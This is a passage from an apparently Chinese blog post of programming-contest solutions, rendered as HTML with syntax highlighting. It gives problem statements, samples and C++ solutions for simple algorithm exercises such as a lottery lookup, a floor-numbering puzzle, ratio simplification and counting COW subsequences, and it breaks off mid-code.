class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> minx,maxx;<br>    <span class="hljs-type">int</span> miny,maxy;<br>&#125;s[<span class="hljs-number">10010</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,ans,a[<span class="hljs-number">10010</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>    &#123;<br>        ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(a, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(a));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cin&gt;&gt;s[i].minx&gt;&gt;s[i].maxx&gt;&gt;s[i].miny&gt;&gt;s[i].maxy;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i==j)<span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(!a[j] &amp;&amp; s[i].minx &lt;= s[j].minx &amp;&amp; s[i].maxx &gt;= s[j].maxx &amp;&amp; s[i].miny &lt;= s[j].miny &amp;&amp; s[i].maxy &gt;= s[j].maxy)<br>                &#123;<br>                    ans++;<br>                    a[j]=<span class="hljs-number">1</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(!a[i] &amp;&amp; s[j].minx &lt;= s[i].minx &amp;&amp; s[j].maxx &gt;= s[i].maxx &amp;&amp; s[j].miny &lt;= s[i].miny &amp;&amp; s[j].maxy &gt;= s[i].maxy)<br>                &#123;<br>                    ans++;<br>                    a[i]=<span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        cout&lt;&lt;ans&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="G-抽奖"><a href="#G-抽奖" class="headerlink" title="G.抽奖"></a>G.抽奖</h1><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">公司举办年会，为了活跃气氛，设置了摇奖环节。参加聚会的每位员工都有一张带有号码的抽奖券。现在，主持人依次公布 n 个不同的获奖号码，小谢看着自己抽奖券上的号码 <span class="hljs-built_in">num</span>，无比紧张。请编写一个程序，如果小谢获奖了，请输出他中的是第几个号码；如果没有中奖，请输出 <span class="hljs-number">0</span>。<br></code></pre></td></tr></table></figure><h3 id="Input-6"><a href="#Input-6" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel">第一行一个正整数 <span class="hljs-built_in">n</span>，表示有 <span class="hljs-built_in">n</span> 个获奖号码，<span class="hljs-number">2</span>&amp;lt;<span class="hljs-built_in">n</span>≤<span class="hljs-number">100</span>。<br>第二行包含 <span class="hljs-built_in">n</span> 个正整数，之间用一个空格隔开，表示依次公布的 <span class="hljs-built_in">n</span> 个获奖号码。<br>第三行一个正整数 num，表示小谢抽奖券上的号码。<br><span class="hljs-number">1</span>≤获奖号码，num&amp;lt;<span class="hljs-number">10000</span>。<br></code></pre></td></tr></table></figure><h3 id="Output-6"><a href="#Output-6" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">一行一个整数，如果小谢中奖了，表示中奖的是第几个号码；如果没有中奖，则为 0。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-6"><a href="#Sample-Input-6" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">7</span><br><span class="hljs-symbol">17 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">9555</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span><br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-6"><a href="#Sample-Output-6" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">3<br></code></pre></td></tr></table></figure><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">暴力<br>单组输入<br></code></pre></td></tr></table></figure><h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,num[<span class="hljs-number">110</span>],lotto,flag=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;num[i];<br>&#125;<br>cin &gt;&gt; lotto;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(num[i] == lotto)<br>&#123;<br>cout&lt;&lt;i+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(i==n)    cout&lt;&lt;<span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="H-比身高"><a href="#H-比身高" class="headerlink" title="H.比身高"></a>H.比身高</h1><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">有 <span class="hljs-built_in">N</span> 个人排成一排，假设他们的身高均为正整数，请找出其中符合以下条件的人：排在他前面且比他高的人数与排在他后面且比他高的人数相等。<br></code></pre></td></tr></table></figure><h3 id="Input-7"><a href="#Input-7" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">第一行为一个正整数 <span class="hljs-built_in">N</span>，<span class="hljs-number">1</span>&amp;lt;<span class="hljs-built_in">N</span>&amp;lt;<span class="hljs-number">1000</span>，表示有多少个人。<br>下面 <span class="hljs-built_in">N</span> 行，每行一个正整数，表示从前往后每个人的身高，假设每个人的身高≤<span class="hljs-number">10000</span>。<br></code></pre></td></tr></table></figure><h3 id="Output-7"><a href="#Output-7" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">一行一个整数，表示满足这个条件的人数。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-7"><a href="#Sample-Input-7" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">4<br>1<br>2<br>1<br>3<br></code></pre></td></tr></table></figure><h3 id="Sample-Output-7"><a href="#Sample-Output-7" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">2<br></code></pre></td></tr></table></figure><h3 id="Hint-1"><a href="#Hint-1" class="headerlink" title="Hint"></a>Hint</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">第 3、第<span class="hljs-number"> 4 </span>个人满足条件。<br>单组输入<br></code></pre></td></tr></table></figure><h2 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,num[<span class="hljs-number">1010</span>],l,r,ans=<span class="hljs-number">0</span>;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;num[i];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>l=r=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i<span class="hljs-number">-1</span>;j&gt;=<span class="hljs-number">0</span>;j--)<br>&#123;<br><span class="hljs-keyword">if</span>(num[j]&gt;num[i])l++;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(num[j]&gt;num[i])r++;<br>&#125;<br><span class="hljs-keyword">if</span>(l==r)ans++;<br>&#125;<br>cout&lt;&lt;ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="I-楼层编号"><a href="#I-楼层编号" class="headerlink" title="I.楼层编号"></a>I.楼层编号</h1><h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">小林在 NOIP 比赛期间住在“新世界”酒店。和其他酒店不一样的是，这个酒店每天都有一个高能的数字 <span class="hljs-built_in">t</span>，这个数字在楼层中是不会出现的，以 <span class="hljs-built_in">t</span>=<span class="hljs-number">3</span> 为例，则 <span class="hljs-number">3</span>、<span class="hljs-number">13</span>、<span class="hljs-number">31</span>、<span class="hljs-number">33</span> 等楼层是不存在的，楼层编号为 <span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">4</span>，<span class="hljs-number">5</span>，…所以实际上的 <span class="hljs-number">4</span> 楼才是 <span class="hljs-number">3</span> 楼。<br>已知小林预订了编号为 m 层的房间，并且当天高能数字是 <span class="hljs-built_in">t</span>，现在他想知道房间所在的真实楼层是多少。<br></code></pre></td></tr></table></figure><h3 id="Input-8"><a href="#Input-8" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">一行两个整数 m 和 <span class="hljs-built_in">t</span>，<span class="hljs-number">1</span>≤m≤<span class="hljs-number">100000</span>，<span class="hljs-number">0</span>≤<span class="hljs-built_in">t</span>≤<span class="hljs-number">9</span>，保证 m 对 <span class="hljs-built_in">t</span> 合法。<br></code></pre></td></tr></table></figure><h3 id="Output-8"><a href="#Output-8" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">一行一个整数，表示真实楼层。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-8"><a href="#Sample-Input-8" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">14 </span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-8"><a href="#Sample-Output-8" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">12<br></code></pre></td></tr></table></figure><h3 id="Hint-2"><a href="#Hint-2" class="headerlink" title="Hint"></a>Hint</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">单组输入<br></code></pre></td></tr></table></figure><h2 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> t,b;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(n&gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        b=n%<span class="hljs-number">10</span>;<br>        n/=<span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">if</span>(b==t)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> m;<br>    <span class="hljs-type">int</span> now=<span class="hljs-number">0</span>;<br>    cin &gt;&gt; m &gt;&gt; t;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">judge</span>(i))now++;<br>    &#125;<br>    cout&lt;&lt;now;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="J-比例简化"><a href="#J-比例简化" class="headerlink" title="J.比例简化"></a>J.比例简化</h1><h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">在社交媒体上，经常会看到针对某一个观点同意与否的民意调查以及结果。例如，对某观点表示支持的有 <span class="hljs-number">1498</span> 人，反对的有 <span class="hljs-number">902</span> 人，那么其比例可以简单地记为<span class="hljs-number">1498</span>∶<span class="hljs-number">902</span>。<br>因该比例的数值太大，难以一眼看出它们的关系。若把比例记为 <span class="hljs-number">5</span>∶<span class="hljs-number">3</span>，虽然与真实结果有一定的误差，但依然能够较为准确地反映调查结果，同时也显得比较直观。<br>现给出支持人数 <span class="hljs-selector-tag">A</span> 和反对人数 <span class="hljs-selector-tag">B</span>，以及一个上限 L，请将 <span class="hljs-selector-tag">A</span> 比 <span class="hljs-selector-tag">B</span> 化简为 <span class="hljs-selector-tag">A</span>′ 比 <span class="hljs-selector-tag">B</span>′，要求在 <span class="hljs-selector-tag">A</span>′和 <span class="hljs-selector-tag">B</span>′ 均不大于 L，且 <span class="hljs-selector-tag">A</span>′ 和 <span class="hljs-selector-tag">B</span>′ 互质（两个整数的最大公约数为 <span class="hljs-number">1</span>）的前提下，<span class="hljs-selector-tag">A</span>′/<span class="hljs-selector-tag">B</span>′≥ <span class="hljs-selector-tag">A</span>/<span class="hljs-selector-tag">B</span> 且 <span class="hljs-selector-tag">A</span>′/<span class="hljs-selector-tag">B</span>′-<span class="hljs-selector-tag">A</span>/<span class="hljs-selector-tag">B</span> 的值尽可能小。<br></code></pre></td></tr></table></figure><h3 id="Input-9"><a href="#Input-9" class="headerlink" title="Input"></a>Input</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">一行三个整数 <span class="hljs-selector-tag">A</span>，<span class="hljs-selector-tag">B</span>，L，每两个整数之间用一个空格隔开，分别表示支持人数、反对人数以及上限。<br></code></pre></td></tr></table></figure><h3 id="Output-9"><a href="#Output-9" class="headerlink" title="Output"></a>Output</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">一行两个整数 <span class="hljs-selector-tag">A</span>′ 和 <span class="hljs-selector-tag">B</span>′，中间用一个空格隔开，表示化简后的比例。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-9"><a href="#Sample-Input-9" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1498 </span><span class="hljs-number">902</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-9"><a href="#Sample-Output-9" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="Hint-3"><a href="#Hint-3" class="headerlink" title="Hint"></a>Hint</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">单组输入,1<span class="hljs-symbol">&amp;lt;</span>=A,B<span class="hljs-symbol">&amp;lt;</span>=1000000,1<span class="hljs-symbol">&amp;lt;</span>=L<span class="hljs-symbol">&amp;lt;</span>=100,A/B<span class="hljs-symbol">&amp;lt;</span>=L<br></code></pre></td></tr></table></figure><h2 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a,b,l,tmp,a1,a2,t;<br>    <span class="hljs-type">double</span> fs,minnum=<span class="hljs-number">10000000</span>,r;<br>    cin&gt;&gt;a&gt;&gt;b&gt;&gt;l;<br>    tmp=__gcd(a,b);<br>    a/=tmp;<br>    b/=tmp;<br>    r= (<span class="hljs-type">double</span>)a / b;<br>    <span class="hljs-keyword">if</span>(a&lt;l&amp;&amp;b&lt;l)cout&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;b;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        a1=a;<br>        a2=b;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=l;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=l;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(__gcd(i,j)!=<span class="hljs-number">1</span>)<span class="hljs-keyword">continue</span>;<br>                fs=(<span class="hljs-type">double</span>)i/j;<br>                <span class="hljs-keyword">if</span>(fs &lt; r)<span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">fabs</span>(fs - r) &lt; minnum)<br>                &#123;<br>                    minnum=<span class="hljs-built_in">fabs</span>(fs - r);<br>                    a1=i;<br>                    a2=j;<br>                &#125;<br>            &#125;<br>        &#125;<br>        cout &lt;&lt; a1 &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; a2;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="K-奶牛碑文"><a href="#K-奶牛碑文" class="headerlink" title="K.奶牛碑文"></a>K.奶牛碑文</h1><h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">小伟暑假期间到大草原旅游，在一块石头上发现了一些有趣的碑文。碑文似乎是一个神秘古老的语言，只包括三个大写字母 <span class="hljs-built_in">C</span>、<span class="hljs-built_in">O</span> 和 <span class="hljs-variable">W</span>。尽管小伟看不懂，但是令他高兴的是，<span class="hljs-built_in">C</span>、<span class="hljs-built_in">O</span>、<span class="hljs-variable">W</span>的顺序形式构成了一句他最喜欢的奶牛单词“<span class="hljs-variable">COW</span>”。现在，他想知道有多少次 <span class="hljs-variable">COW</span> 出现在文本中。<br>如果 <span class="hljs-variable">COW</span> 内穿插了其他字符，只要 <span class="hljs-variable">COW</span> 字符出现在正确的顺序，小伟也不介意。甚至，他也不介意出现不同的 <span class="hljs-variable">COW</span> 共享一些字母。例如，<span class="hljs-variable">CWOW</span> 出现了 <span class="hljs-number">1</span> 次 <span class="hljs-variable">COW</span>，<span class="hljs-variable">CCOW</span> 算出现了<span class="hljs-number">2</span> 次 <span class="hljs-variable">COW</span>，<span class="hljs-variable">CCOOWW</span> 算出现了 <span class="hljs-number">8</span> 次 <span class="hljs-variable">COW</span>。<br></code></pre></td></tr></table></figure><h3 id="Input-10"><a href="#Input-10" class="headerlink" title="Input"></a>Input</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">第 <span class="hljs-number">1</span> 行为 <span class="hljs-number">1</span> 个整数 <span class="hljs-built_in">N</span>。<br>第 <span class="hljs-number">2</span> 行为 <span class="hljs-built_in">N</span> 个字符的字符串，每个字符是一个 <span class="hljs-built_in">C</span>、<span class="hljs-built_in">O</span> 或 <span class="hljs-variable">W</span>。<br></code></pre></td></tr></table></figure><h3 id="Output-10"><a href="#Output-10" class="headerlink" title="Output"></a>Output</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">输出 COW 作为输入字符串的字串出现的次数（不一定是连续的）。<br>提示：答案会很大，建议用 <span class="hljs-number">64</span> 位整数（<span class="hljs-type">long</span> <span class="hljs-type">long</span>）。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-10"><a href="#Sample-Input-10" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">6<br>COOWWW<br></code></pre></td></tr></table></figure><h3 id="Sample-Output-10"><a href="#Sample-Output-10" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">6<br></code></pre></td></tr></table></figure><h3 id="Hint-4"><a href="#Hint-4" class="headerlink" title="Hint"></a>Hint</h3><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">对于 <span class="hljs-number">50</span><span class="hljs-comment">% 的数据满足：N≤60。</span><br>对于 <span class="hljs-number">100</span><span class="hljs-comment">% 的数据满足：N≤100000。</span><br>单组输入<br></code></pre></td></tr></table></figure><h2 id="Code-10"><a href="#Code-10" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> c=<span class="hljs-number">0</span>,co=<span class="hljs-number">0</span>,cow=<span class="hljs-number">0</span>;<br>    string s;<br>    cin &gt;&gt; n &gt;&gt; s;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(s[i] == <span class="hljs-string">&#x27;C&#x27;</span>)c++;<br>        <span class="hljs-keyword">if</span>(s[i] == <span class="hljs-string">&#x27;O&#x27;</span>)co+=c;<br>        <span class="hljs-keyword">if</span>(s[i] == <span class="hljs-string">&#x27;W&#x27;</span>)cow+=co;<br>    